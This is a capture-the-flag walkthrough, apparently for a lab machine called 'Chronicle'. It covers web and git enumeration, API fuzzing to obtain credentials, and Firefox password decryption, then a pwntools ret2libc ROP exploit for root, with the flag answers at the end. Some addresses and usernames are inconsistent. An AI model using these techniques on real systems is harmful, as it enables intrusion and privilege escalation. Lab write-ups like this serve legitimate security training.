# Chronicle
## 07-06-2022
## level : easy


Machine IP : `10.10.209.103`



## Challenge

Scan the Machine with Nmap :
```
nmap -sV 10.10.209.103 -oN chronicle_sv.txt

```

Gobuster Scan 
```
gobuster dir -u http://10.10.209.103 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 | tee directory.txt
```

We can see that there is a folder called `old`

lets brows to that website and again run gobuster on that endpoint
```
gobuster dir -u http://10.10.209.103/old/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 | tee directory.txt
```

Now we can see that there is a `.git` folder available 

Just downlaod the folder 

```
wget http://10.10.209.103/old/.git --recursive --continue
```

Now just see the git logs and code of the site and how it works.

in the forgot password code we found a `/api/` endpoint

we will use this to exploit and also we've found username as `someone` and a api key.


so lets just modify the forgot password request to 
```
POST /api/admin HTTP/1.1
Host: 10.10.209.103:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.209.103:8081/forgot
Upgrade-Insecure-Requests: 1

{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}

```

But that also didn't work for use .

Lets now try to find a username using the ffuf
```
ffuf -w /usr/share/wordlists/rockyou.txt -X POST -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}' -u http://10.10.209.103:8081/api/FUZZ -fw 2 

```

So Now we have found a username.

lets send the request again with the new username
```
curl -X POST http://10.10.110.85:8081/api/tommy -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}'

```
Now we got a password for this user

Now lets login with SSH

We Just logged in to the system using the SSH


### Privilege Escalation

After login we can see that there is a firefox backup folder lets download it using the python web server

then use this tool with password `password1`
```
https://github.com/unode/firefox_decrypt
```

Now we got a password and a username lets login as the another user

```
su crulJ
```

Now inside the `mailing` forlder we have a binary file.

Now use the command to find out the libc base address
```
ldd smail
```
The base address is : `0x00007ffff7ffa000`


Getting system location using the above found library 
```
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
```
The offset of system is : `0x4f550`

Find the `/bin/bash` location in that library
```
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'
```

We've found the address of `/bin/sh` is `1b3e1a`

Find the return address of the pointer
```
objdump -d smail | grep ret

```

The return address is `400556`

Lets build the exploit using python
```
#!/usr/bin/python3
from pwn import *

p = process('./smail')

base = 0x7ffff79e2000
sys = base + 0x4f550
binsh = base + 0x1b3e1a

rop_rdi = 0x4007f3

payload = b'A' * 72
payload += p64(0x400556)
payload += p64(rop_rdi)
payload += p64(binsh)
payload += p64(sys)
payload += p64(0x0)


p.clean()
p.sendline("2")
p.sendline(payload)
p.interactive()




```

If any error occured regarding pwntool version
```
echo "never" > /home/carlJ/.cache/.pwntools-cache-3.6/update
```

now just run the exploit
```
chmod +x exp
./exp
```

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| user.txt  | 7ba840222ecbdb57af4d24eb222808ad |
| root.txt  | f21979de76c0302154cc001884143ab2 |









#    THE END 
